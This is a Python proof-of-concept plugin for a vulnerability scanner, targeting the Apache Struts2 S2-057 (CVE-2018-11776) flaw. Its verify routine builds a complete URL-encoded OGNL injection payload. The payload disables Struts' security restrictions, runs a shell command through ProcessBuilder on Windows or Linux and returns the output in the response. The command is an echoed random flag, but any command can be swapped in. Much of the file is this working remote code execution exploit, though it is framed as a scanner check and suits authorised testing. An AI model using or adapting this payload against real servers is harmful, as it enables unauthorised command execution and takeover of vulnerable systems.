#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-22 10:33:13
LastEditors: recar
LastEditTime: 2022-03-24 11:46:14
'''

from plugins.poc.base import PocBase
from http import client
# 这里需要设置http为1.0 才能成功
client.HTTPConnection._http_vsn=10
client.HTTPConnection._http_vsn_str='HTTP/1.0'

class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "Struts2 S2-057 远程命令执行漏洞"
        self.cve = "CVE-2018-11776"
        self.author = "Recar"
        self.desc = """当Struts2的配置满足以下条件时：
                        alwaysSelectFullNamespace值为true
                        action元素未设置namespace属性，或使用了通配符
                        namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。

                        影响版本: 小于等于 Struts 2.3.34 与 Struts 2.5.16"""
        self.fingerprint = "struts2"

    def verify(self):
        self.flag = self.gen_random_str()
        origin_url = self.url_info.get('origin_url')
        suffix = origin_url.split('/')[-1]
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                    'Accept': '*/*'
                }
        cmd = "echo "+self.flag
        payload = """%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27"""+cmd+"""%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D"""
        url = "{0}/{1}/{2}".format(self.base_url, payload, suffix)
        self.logger.debug(url)
        response = self.request(url)
        if self.flag in response.text and response.status_code == 200:
            return True, url
        return False, None
